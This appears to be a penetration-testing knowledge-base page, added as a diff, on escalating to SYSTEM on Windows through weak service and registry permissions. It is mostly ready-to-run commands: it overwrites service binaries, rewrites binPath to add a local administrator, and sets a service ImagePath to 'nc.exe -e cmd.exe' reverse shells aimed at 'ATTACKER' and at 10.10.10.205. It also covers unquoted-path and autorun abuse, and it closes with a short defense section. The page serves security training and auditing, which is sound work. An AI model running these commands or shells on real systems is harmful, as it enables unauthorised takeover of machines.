@@ -1,0 +1,160 @@
+---
+title: Weak Service & Registry Permissions
+description: Escalating to SYSTEM through misconfigured ACLs - a modifiable service binary you can overwrite, a service whose configuration you can rewrite (sc config binPath), a writable services registry key (ImagePath), unquoted service paths, and modifiable autorun entries. Enumerate with SharpUp/PowerUp/winPEAS/accesschk, then turn a weak permission into a SYSTEM shell or a new local admin.
+mitre: [T1543.003, T1574, T1068]
+d3fend: [D3-FA]
+impact: [PrivEsc, SystemCompromise]
+owasp: []
+noise: moderate
+sidebar:
+  order: 11
+  label: Weak permissions
+---
+
+## TL;DR
+
+Most Windows services run as `NT AUTHORITY\SYSTEM`. If an unprivileged user can modify what a service *runs* - its binary on disk, its configuration, or its registry key - starting (or waiting for) that service runs attacker code as SYSTEM. These flaws are rare in large-vendor software but common in third-party, open-source, and in-house applications.
+
+```
+# Enumerate candidates
+.\SharpUp.exe audit                                   # GhostPack: modifiable binaries/services
+powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
+.\winPEASx64.exe quiet servicesinfo
+
+# 1. Weak file ACL on the binary → overwrite it
+icacls "C:\Program Files\Vuln\service.exe"            # look for BUILTIN\Users / Everyone :(F)
+copy /Y evil.exe "C:\Program Files\Vuln\service.exe" & sc start VulnSvc
+
+# 2. Weak service config ACL → rewrite binPath
+accesschk.exe /accepteula -quvcw VulnSvc              # SERVICE_ALL_ACCESS for Authenticated Users?
+sc config VulnSvc binpath= "cmd /c net localgroup administrators pwn /add"
+sc stop VulnSvc & sc start VulnSvc
+
+# 3. Writable services registry key → rewrite ImagePath
+accesschk.exe /accepteula "user" -kvuqsw hklm\System\CurrentControlSet\services
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc -Name ImagePath -Value "C:\temp\nc.exe -e cmd.exe ATTACKER 443"
+```
+
+Success indicator: the service's next start runs your command as SYSTEM - a new local admin appears in `net localgroup administrators`, or a reverse shell returns `nt authority\system`.
+
+## Enumerate the weakness
+
+Automated scanners find these fastest; each flags a slightly different subset, so run more than one when a target is quiet:
+
+- **SharpUp** (`audit`) - `Modifiable Services` (config ACL) and `Modifiable Service Binaries` (file ACL).
+- **PowerUp.ps1** (`Invoke-AllChecks`) - the PowerShell equivalent; also finds unquoted paths and `AlwaysInstallElevated`.
+- **winPEAS** (`servicesinfo`) - broad, noisy, colour-coded.
+- **accesschk.exe** (Sysinternals) - the manual verifier for a specific service or the whole services registry tree.
+
+Then confirm by hand before acting - the exploit path differs by *which* permission is weak.
+
+## 1. Modifiable service binary (weak file ACL)
+
+The service's executable is writable by your user. Verify with `icacls`:
+
+```
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+# BUILTIN\Users:(I)(F)   Everyone:(I)(F)   ← full control for unprivileged users
+```
+
+Back up the original, drop a payload (msfvenom reverse shell, or a local-admin-adding stub) in its place, and (re)start the service:
+
+```
+copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\temp\svc.bak
+copy /Y evil.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+sc start SecurityService
+```
+
+If the service is `StartMode: Auto` but already running, you need restart rights (next section) or a reboot. **Restore the original binary afterward** so the service keeps working.
+
+## 2. Weak service configuration (modifiable service, `sc config`)
+
+Here the *service object* grants you write access even though the binary is protected. `accesschk` shows the ACL; `SERVICE_ALL_ACCESS` (or `SERVICE_CHANGE_CONFIG` + `SERVICE_START`/`SERVICE_STOP`) for a group you're in is the win:
+
+```
+accesschk.exe /accepteula -quvcw WindscribeService
+#  RW NT AUTHORITY\Authenticated Users  SERVICE_ALL_ACCESS   ← full control
+```
+
+Flags: `-q` no banner, `-u` suppress errors, `-v` verbose, `-c` a service name, `-w` write access only.
+
+Rewrite the binary path to any command, then cycle the service. The command runs as the service account even though the "service" fails to start (the binary isn't a real service - Windows runs it, it errors, the side effect already happened):
+
+```
+sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"
+sc stop WindscribeService
+sc start WindscribeService          # returns error 1053 - the net command still ran
+```
+
+Note the space after `binpath=` - `sc` requires it. The Update Orchestrator Service (`UsoSvc`), which runs as SYSTEM and can't be removed, was exploitable this exact way before the patch for **CVE-2019-1322**.
+
+**Cleanup:** restore the original `binPath` and restart so the service works:
+
+```
+sc config WindscribeService binpath= "\"C:\Program Files (x86)\Windscribe\WindscribeService.exe\""
+sc start WindscribeService
+```
+
+The inner escaped quotes matter: `sc`'s own parsing strips the outer pair, so `binpath= "C:\Program Files...\x.exe"` stores the path **unquoted** - restoring it that way reintroduces an unquoted-service-path weakness (see below) instead of fixing the service. Escape the quotes (`\"..\"`) so they're literally stored in `ImagePath`.
+
+## 3. Permissive registry ACL (`ImagePath`)
+
+Service definitions live under `HKLM\System\CurrentControlSet\services\<name>`; the `ImagePath` value is the binary that runs. A writable key is equivalent to a writable service config. Find them with `accesschk` (`-k` registry, `-s` recurse):
+
+```
+accesschk.exe /accepteula "user" -kvuqsw hklm\System\CurrentControlSet\services
+#  RW HKLM\System\CurrentControlSet\services\VulnSvc   KEY_ALL_ACCESS
+```
+
+Overwrite `ImagePath`, then start the service:
+
+```
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc -Name "ImagePath" `
+  -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+
+## 4. Unquoted service path
+
+When a service's `BINARY_PATH_NAME` contains spaces and is **not** quoted, Windows tries each space-delimited prefix (with `.exe` implied) in order:
+
+```
+sc qc SystemExplorerHelpService
+#  BINARY_PATH_NAME : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+# Windows tries, in order:
+#   C:\Program.exe
+#   C:\Program Files (x86)\System.exe
+#   C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+
+Plant an executable at one of the earlier names and it runs as the service account. Find them with:
+
+```
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+In practice this is **often found but rarely exploitable** - writing to `C:\` or `C:\Program Files\` needs admin rights, and even where it's writable you usually can't restart the service without a reboot. Treat it as low-probability unless the writable prefix sits in a directory you control.
+
+## 5. Modifiable autorun binary
+
+Programs set to run at logon/boot are another path - if you can overwrite a listed binary or write to its `Run` key, you execute as whoever logs in next (an admin, ideally):
+
+```
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+```
+
+Check write access to each listed `command` and to the backing `HKLM\...\CurrentVersion\Run` keys. This is slower-yielding than the service paths above (it waits on a logon) but is a reliable persistence-plus-escalation primitive when a privileged user logs in regularly.
+
+## Defense
+
+- Service binaries and their directories should be writable only by `Administrators`/`SYSTEM`; audit third-party installers, which frequently loosen these ACLs.
+- Lock down service object permissions - unprivileged groups should never hold `SERVICE_CHANGE_CONFIG` or write to a service's registry key.
+- **Always quote service binary paths.** Installers should wrap `BINARY_PATH_NAME` in quotes.
+- Run services with the least privilege they need (a virtual/service account, gMSA) rather than `LocalSystem`, so a hijack yields less.
+- Baseline autorun entries and alert on changes to `Run` keys and startup folders.
+
+## Related
+
+- [Initial enumeration](/codex/windows/privesc/initial-enumeration/) - finding services, patch level, and installed software first
+- [Vulnerable services](/codex/windows/privesc/vulnerable-services/) - exploiting *known-vulnerable* third-party services rather than ACL flaws
+- [DLL hijacking](/codex/windows/privesc/dll-hijacking/) - a related "service loads attacker code" path through the DLL search order
+- [SeImpersonate](/codex/windows/privesc/seimpersonate/) - if the weak service runs as a service account with impersonation rights, that's an alternate route to SYSTEM
